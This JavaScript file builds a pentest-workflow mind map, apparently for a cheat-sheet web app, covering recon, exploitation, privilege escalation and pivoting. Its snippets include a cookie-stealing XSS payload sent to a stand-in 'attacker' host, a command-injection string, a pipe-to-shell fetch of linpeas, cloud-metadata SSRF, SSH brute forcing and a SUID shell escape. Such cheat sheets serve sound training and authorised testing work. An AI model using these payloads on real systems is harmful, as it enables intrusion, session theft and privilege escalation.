(() => {
  const createNode = (id, label, description, commands, type='technique', icon, children=[], resources=[]) => ({
    id,
    data: { label, description, commands, type, icon, resources },
    children
  });

  window.MINDMAP_GENERAL_TREE = createNode('gen-root', 'General Pentest', 'Engagement Workflow', [], 'root', 'Shield', [
    // RECON
    createNode('recon', 'Reconnaissance', 'Information Gathering', [], 'category', 'Search', [
      createNode('passive', 'Passive Recon', 'OSINT & Footprinting', [], 'category', 'Eye', [
        createNode('osint', 'OSINT', 'Open Source Intel', [
          { description: 'Google Dorks', code: 'site:target.com filetype:pdf confidential' },
          { description: 'Whois', code: 'whois target.com' },
          { description: 'Shodan', code: 'shodan search "org:Target"' }
        ], 'technique', 'Globe'),
        createNode('subdomains', 'Subdomains', 'Expansion', [
          { description: 'Subfinder', code: 'subfinder -d target.com -o subs.txt' },
          { description: 'Amass', code: 'amass enum -d target.com' }
        ], 'tool', 'List')
      ]),
      createNode('active', 'Active Recon', 'Scanning & Probing', [], 'category', 'Activity', [
        createNode('port-scan', 'Port Scanning', 'Service Discovery', [
          { description: 'Nmap TCP', code: 'nmap -sC -sV -p- target' },
          { description: 'Nmap UDP', code: 'nmap -sU --top-ports 100 target' },
          { description: 'Masscan', code: 'masscan -p1-65535 target --rate=1000' }
        ], 'tool', 'Target'),
        createNode('web-enum', 'Web Enumeration', 'Directories & Tech', [
          { description: 'Gobuster', code: 'gobuster dir -u url -w wordlist.txt -x php,txt,html' },
          { description: 'Feroxbuster', code: 'feroxbuster -u url' },
          { description: 'Wappalyzer', code: 'Identify Technologies' }
        ], 'tool', 'Globe')
      ])
    ]),

    // EXPLOITATION
    createNode('exploitation', 'Exploitation', 'Gaining Access', [], 'category', 'Sword', [
      createNode('web-exploit', 'Web Exploitation', 'OWASP Top 10 & More', [], 'category', 'Globe', [
        createNode('injection', 'Injection', 'SQLi / Command', [
          { description: 'SQLMap', code: 'sqlmap -u "url?id=1" --batch --dbs' },
          { description: 'Cmd Injection', code: '; whoami; id' }
        ], 'technique', 'Database'),
        createNode('xss', 'XSS', 'Cross-Site Scripting', [
          { description: 'Reflected', code: '<script>alert(1)</script>' },
          { description: 'Steal Cookie', code: '<img src=x onerror=this.src="http://attacker/?c="+document.cookie>' }
        ], 'technique', 'Code'),
        createNode('ssrf', 'SSRF', 'Server Side Request Forgery', [
          { description: 'Localhost', code: 'http://localhost/admin' },
          { description: 'Cloud Meta', code: 'http://169.254.169.254/latest/meta-data/' }
        ], 'technique', 'Server'),
        createNode('idor', 'IDOR', 'Insecure Direct Object Reference', [
          { description: 'Change ID', code: '/api/users/123 -> /api/users/124' }
        ], 'technique', 'User'),
        createNode('deserial', 'Deserialization', 'Object Injection', [
          { description: 'Ysoserial', code: 'java -jar ysoserial.jar CommonsCollections1 "calc.exe"' }
        ], 'technique', 'Code')
      ]),
      createNode('net-exploit', 'Network Exploitation', 'Infrastructure', [], 'category', 'Network', [
        createNode('brute', 'Brute Force', 'Credential Guessing', [
          { description: 'Hydra SSH', code: 'hydra -l root -P pass.txt ssh://ip' },
          { description: 'Hydra RDP', code: 'hydra -l User -P pass.txt rdp://ip' }
        ], 'tool', 'Lock'),
        createNode('metasploit', 'Metasploit', 'Framework', [
          { description: 'Search', code: 'search type:exploit name:service' },
          { description: 'Handler', code: 'use exploit/multi/handler' }
        ], 'tool', 'Bomb')
      ])
    ]),

    // POST-EXPLOITATION
    createNode('post-exp', 'Post Exploitation', 'PrivEsc & Loot', [], 'category', 'Flag', [
      createNode('linux-pe', 'Linux PrivEsc', 'Root Access', [], 'category', 'Server', [
        createNode('linpeas', 'LinPEAS', 'Auto Enumeration', [
          { description: 'Run', code: 'curl -L linpeas.sh | sh' }
        ], 'tool', 'Search'),
        createNode('cron', 'Cron Jobs', 'Scheduled Tasks', [
          { description: 'Cat Crontab', code: 'cat /etc/crontab' },
          { description: 'Monitor Processes', code: 'pspy64' }
        ], 'technique', 'Clock'),
        createNode('suid-gtfobins', 'SUID / GTFOBins', 'Binaries', [
          { description: 'Find SUID', code: 'find / -perm -u=s -type f 2>/dev/null' },
          { description: 'Nmap SUID', code: 'nmap --interactive -> !sh' }
        ], 'technique', 'Terminal')
      ]),
      createNode('win-pe', 'Windows PrivEsc', 'System Access', [], 'category', 'Monitor', [
        createNode('winpeas', 'WinPEAS', 'Auto Enumeration', [
          { description: 'Run', code: '.\\winPEASx64.exe' }
        ], 'tool', 'Search'),
        createNode('kernel-exploit', 'Kernel Exploits', 'Missing Patches', [
          { description: 'Watson', code: 'Watson.exe' },
          { description: 'Sherlock', code: 'Sherlock.ps1' }
        ], 'technique', 'Cpu')
      ]),
      createNode('pivoting', 'Pivoting', 'Tunneling', [], 'category', 'Share2', [
        createNode('chisel', 'Chisel', 'Tunnel over HTTP', [
          { description: 'Server', code: 'chisel server -p 8000 --reverse' },
          { description: 'Client', code: 'chisel client ip:8000 R:socks' }
        ], 'tool', 'Network'),
        createNode('ssh-tunnel', 'SSH Tunnel', 'Port Forwarding', [
          { description: 'Local', code: 'ssh -L 8080:127.0.0.1:80 user@target' },
          { description: 'Dynamic (Socks)', code: 'ssh -D 1080 user@target' }
        ], 'technique', 'Terminal')
      ])
    ])
  ]);
})();
